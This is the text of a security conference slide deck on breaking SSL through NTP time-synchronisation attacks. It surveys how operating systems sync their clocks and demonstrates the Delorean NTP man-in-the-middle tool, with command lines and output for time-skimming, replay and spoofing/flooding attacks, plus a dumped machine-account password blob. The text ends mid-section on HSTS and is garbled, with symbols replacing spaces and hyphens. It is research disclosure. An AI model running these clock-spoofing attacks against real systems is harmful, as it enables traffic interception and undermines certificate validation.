Breaking SSL using time synchronisation attacks
Jose Selvi, Senior Security Consultant
• Jose%Selvi%
• +10%years%working%in%security%
• Senior%security%Consultant%
• SANS%Institute%Community%Instructor%
• GIAC%Security%Expert%(GSE)%
• Twitter:%@JoseSelvi%
• Blog:%http://www.pentester.es
$ whois jselvi
Valencia: Beach, Sun & Hacking
Warning! Spanish accent!
Let’s Go!
• Modern Time Synchronisation 
• Get in a Delorean 
• HTTP Strict Transport Security 
• Windows task scheduler 
• Public Key Infrastructure 
• Conclusions & Recommendations
Network Time Protocol (NTP)
• Time%Synchronisation%Services.%
• RFCK1305%(v3)%/%RFCK5905%(v4)%/%RFCK4330%
(SNTPv4).%
• By%default%in%(almost)%all%operating%systems.%
• No%secured%by%default.%
• Vulnerable%to%ManKinKtheKMiddle%attacks.
NTP Packet
Example: Ubuntu Linux
Mac OS X - Mavericks
• New%synchronisation%service%
• NTP%daemon%exits,%but%not%synchronises.%
• Just%writes%in%/var/db/ntp.drift%
• A%new%service%called%“pacemaker”%check%
that%file%and%change%the%clock.%
• It%seems%it%doesn’t%work%as%it%should…
http://www.atmythoughts.com/livingKinKaKtechKfamilyKblog/2014/2/28/whatKtimeKisKit
Does NTP work?
/usr/libexec/ntpd-wrapper
Mac OS X - Mavericks
Fedora Linux
• The%easiest%
• NTPv3.%
• More%than%one%NTP%server%
• Requests%each%minute!
$%tcpdump%Ki%eth0%Knn%src%port%123%
12:43:50.614191%IP%192.168.1.101.123%>%89.248.106.98.123:%NTPv3,%Client,%length%48%
12:44:55.696390%IP%192.168.1.101.123%>%213.194.159.3.123:%NTPv3,%Client,%length%48%
12:45:59.034059%IP%192.168.1.101.123%>%89.248.106.98.123:%NTPv3,%Client,%length%48
Ubuntu Linux
• Very%simple%
• NTPv4.%
• Each%time%it%connects%to%a%network%(and%at%
boot%time,%of%course).
$%ls%/etc/network/ifKup.d/%
000resolvconf%%avahiKdaemon%%ntpdate%%wpasupplicant%
avahiKautoipd%%%ethtool%%%%%%%%%%%%%upstart
Windows
• NTPv3%but…%
• The%most%secure.%
• Synchronisation%each%7%days.%
• More%than%15%hours%drift%isn’t%allowed.%
• Domain%members%work%in%a%different%
way.
W32time service
Max[Pos|Neg]PhaseCorrection
W7 / W8 
15 horas
W2K12 48 horas
What the Internet says?
Manual Synchronisation
Windows Domain Members
Windows Domain Members
5E
04
00
00
Key Selector
RID
Windows Domain Members
/* Sign the NTP response with the unicodePwd */ 
MD5Init(&ctx); 
MD5Update(&ctx, nt_hash->hash, sizeof(nt_hash->hash)); 
MD5Update(&ctx, sign_request.packet_to_sign.data, 
sign_request.packet_to_sign.length); 
MD5Final(signed_reply.signed_packet.data + sign_request.packet_to_sign.length 
+ 4, &ctx);
         * Username : DELOREANPC$ 
         * Domain   : PTDOM 
         * Password : 01 09 8b 63 35 9f 69 3d 15 9f d1 2a 03 74 ef 9b c3 70 ec 0 
7 3b 5c d3 54 84 1e ca 94 94 01 b3 b7 99 0f b0 7e 88 fc 1c 10 67 f3 ee 5e f2 26 
bd 1d b2 6a e1 d8 fa ff ac e7 18 32 56 35 57 6f 0b 7d a1 24 31 d7 57 88 39 84 c3 
 5f aa 15 df f8 6a d3 d9 35 51 15 f5 d6 26 c2 d6 c4 18 ec 0d 22 21 be 6c f2 ac 8 
8 2a 95 49 92 11 b8 a6 5d 03 77 aa 08 c6 9d 75 b4 62 0a 9a dc 6c c1 e7 7d 28 75 
4c 2a 5b 44 00 19 8e bf b3 81 ca 23 31 01 e5 aa 14 c2 28 8c 71 9b a0 8b 9f ad 47 
 be 53 7f e9 b4 e1 21 8f ff 82 11 4b cd e8 d6 d0 b7 8d b8 e2 69 08 42 e3 0a 3c 3 
9 6c 61 97 3c cb e8 e5 2b bd 1b 33 c6 55 08 1c 3e d5 49 d3 b1 20 93 9f ed 27 dd 
82 eb c4 26 15 30 3b d3 0a 76 df 75 52 61 c8 76 9f 22 a2 aa d0 39 49 27 35 46 22 
 80 9e 59 f9 d7 80 9f
Windows Domain Members
Not a silver bullet
Let’s Go!
• Modern Time Synchronisation 
• Get in a Delorean 
• HTTP Strict Transport Security 
• Windows task scheduler 
• Public Key Infrastructure 
• Conclusions & Recommendations
Delorean
• NTP%MitM%Tool.%Free.%Open%Source.%Python.%
– http://github.com/PentesterES/Delorean%
• Based%on%a%kimifly’s%work:%
– http://github.com/limifly/ntpserver%
• Implements%several%attacks.%
• It%pretends%to%be%an%NTP%attack%‘suite’.
Delorean
$%./delorean.py%Kh%
Usage:%delorean.py%[options]%
Options:%
%%Kh,%KKhelp%%%%%%%%%%%%show%this%help%message%and%exit%
%%Ki%INTERFACE,%KKinterface=INTERFACE%
%%%%%%%%%%%%%%%%%%%%%%%%Listening%interface%
%%Kp%PORT,%KKport=PORT%%Listening%port%
%%Kn,%KKnobanner%%%%%%%%Not%show%Delorean%banner%
%%Ks%STEP,%KKforceKstep=STEP%
%%%%%%%%%%%%%%%%%%%%%%%%Force%the%time%step:%3m%(minutes),%4d%(days),%1M%
%%%%%%%%%%%%%%%%%%%%%%%%(month)%
%%Kd%DATE,%KKforceKdate=DATE%
%%%%%%%%%%%%%%%%%%%%%%%%Force%the%date:%YYYYKMMKDD%hh:mm[:ss]%
%%Kr,%KKrandomKdate%%%%%Use%random%date%each%time
Basic attacks
#%./delorean.py%Kn%
[22:02:57]%Sent%to%192.168.10.102:55962%K%Going%to%the%future!%2015K06K20%22:02%
[22:02:59]%Sent%to%192.168.10.102:39708%K%Going%to%the%future!%2015K06K20%22:02
#%./delorean.py%Kd%‘2020K08K01’%Kn%
[22:02:57]%Sent%to%192.168.10.102:55962%K%Going%to%the%future!%2015K06K20%22:02%
[22:02:59]%Sent%to%192.168.10.102:39708%K%Going%to%the%future!%2015K06K20%22:02
#%./delorean.py%Kr%Kn%
[22:02:57]%Sent%to%192.168.10.102:55962%K%Going%to%the%future!%2015K06K20%22:02%
[22:02:59]%Sent%to%192.168.10.102:39708%K%Going%to%the%future!%2015K06K20%22:02
#%./delorean.py%Ks%10d%Kn%
[22:02:57]%Sent%to%192.168.10.102:55962%K%Going%to%the%future!%2015K06K20%22:02%
[22:02:59]%Sent%to%192.168.10.102:39708%K%Going%to%the%future!%2015K06K20%22:02
29
DEMO
Time Skimming Attack
3153600 secs 
later
Time Sync
Time Skimming Attack
#%./delorean.py%Kk%15h%Kt%10s%Kn%
[21:57:26]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K11%12:57%
[21:57:33]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K12%03:57%
[21:57:37]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K12%18:56%
[21:57:44]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K13%09:56%
[21:57:50]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K14%00:56%
[21:57:58]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K14%15:56%
[21:58:04]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K15%06:56%
[21:58:11]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K15%21:56%
[21:58:17]%Sent%to%192.168.10.105:123%K%Going%to%the%future!%2015K06K16%12:56
32
DEMO
Replay Attack
$%./delorean.py%Kn%Kr%capture.pcap%
[06:19:13]%Replayed%to%192.168.10.105:39895%K%Going%to%the%past!%2015K06K24%21:41%
[06:19:17]%Replayed%to%192.168.10.105:39895%K%Going%to%the%past!%2015K06K24%21:41
Spoofing Attack
$%./delorean.py%Kn%Kf%192.168.10.10%Ko%8.8.8.8%Kr%capture.pcap%%
Flooding%to%192.168.10.10%
$%tcpdump%Knn%Kp%Ki%eth1%host%192.168.10.10%
tcpdump:%verbose%output%suppressed,%use%Kv%or%Kvv%for%full%protocol%decode%
listening%on%eth1,%linkKtype%EN10MB%(Ethernet),%capture%size%65535%bytes%
08:26:07.621412%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48%
08:26:07.682578%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48%
08:26:07.761407%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48%
08:26:07.766434%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48%
08:26:07.843923%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48%
08:26:07.905666%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48%
08:26:07.922923%IP%8.8.8.8.123%>%192.168.10.10.123:%NTPv4,%Server,%length%48
Anti replaying…
Let’s Go!
• Modern Time Synchronisation 
• Get in a Delorean 
• HTTP Strict Transport Security 
• Windows task scheduler 
• Public Key Infrastructure 
• Conclusions & Recommendations
Stripping SSL links
HTTPS
HTTP
Attacker
Client
Server
GET / HTTP/1.1
https://myweb/login>
http://myweb/login>
HTTP Strict Transport Security
• RFCK6797:%November%2012.%
• Also%known%as%HSTS%or%STS.%
• Prevent%HTTP%connections.%
• Prevent%accepting%selfKsigned%and%
rogue%certificates.%
• Use%a%new%“StrictKTransportKSecurity”%
header.
Who uses HSTS?